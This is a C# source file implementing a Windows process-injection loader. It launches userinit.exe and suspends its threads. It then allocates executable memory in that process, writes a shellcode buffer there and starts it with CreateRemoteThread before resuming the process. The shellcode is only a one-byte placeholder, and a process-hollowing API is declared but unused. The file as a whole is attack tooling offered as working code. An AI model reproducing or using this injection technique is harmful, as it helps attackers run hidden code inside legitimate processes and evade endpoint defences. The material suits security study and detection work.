using System.Diagnostics;
using System.Runtime.InteropServices;
using System;
using System.Text;
using System.Threading;


public class Program
{

    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openthread
    [DllImport("kernel32.dll")]
    //static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);
    static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-suspendthread
    [DllImport("kernel32.dll")]
    static extern uint SuspendThread(IntPtr hThread);

    //https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-resumethread
    [DllImport("kernel32.dll")]
    static extern int ResumeThread(IntPtr hThread);

    //https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-zwunmapviewofsection
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);


    [DllImport("kernel32.dll")]
    //public static extern IntPtr VirtualAllocEx(IntPtr lpHandle,IntPtr lpAddress, IntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    //https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);

    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
    private static UInt32 SUSPEND_RESUME = 0x0002;

    public static void Main()
    {


        byte[] shellcode = new byte[1] { 0xfc };

        string proc = "userinit.exe";

        Process newproc;
        newproc = Process.Start(proc);
        Console.WriteLine("Started " + proc + " with Process Id:" + newproc.Id);
        Console.WriteLine("Suspending process...");
        foreach (ProcessThread thread in newproc.Threads)
        {
            IntPtr pOpenThread;
            pOpenThread = OpenThread(SUSPEND_RESUME, false, (uint)thread.Id);
            if (pOpenThread == IntPtr.Zero)
            {
                break;
            }
            SuspendThread(pOpenThread);
        }
        Console.WriteLine("Suspended!");

        IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, newproc.Id);

        IntPtr spaceAddr = VirtualAllocEx(procHandle, IntPtr.Zero, shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Console.WriteLine("Allocating memory");
        WriteProcessMemory(procHandle, spaceAddr, shellcode, new IntPtr(shellcode.Length), 0);
        Console.WriteLine("Copied shellcode in memory");
        IntPtr pinfo = IntPtr.Zero;
        IntPtr threatH = CreateRemoteThread(procHandle, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
        Console.WriteLine("Created remote thread");
        Console.WriteLine("Resuming process...");

        foreach (ProcessThread thread in newproc.Threads)
        {
            IntPtr pOpenThread;
            pOpenThread = OpenThread(SUSPEND_RESUME, false, (uint)thread.Id);
            if (pOpenThread == IntPtr.Zero)
            {
                break;
            }
            ResumeThread(pOpenThread);
        }
        Console.WriteLine("Resumed!");


    }

}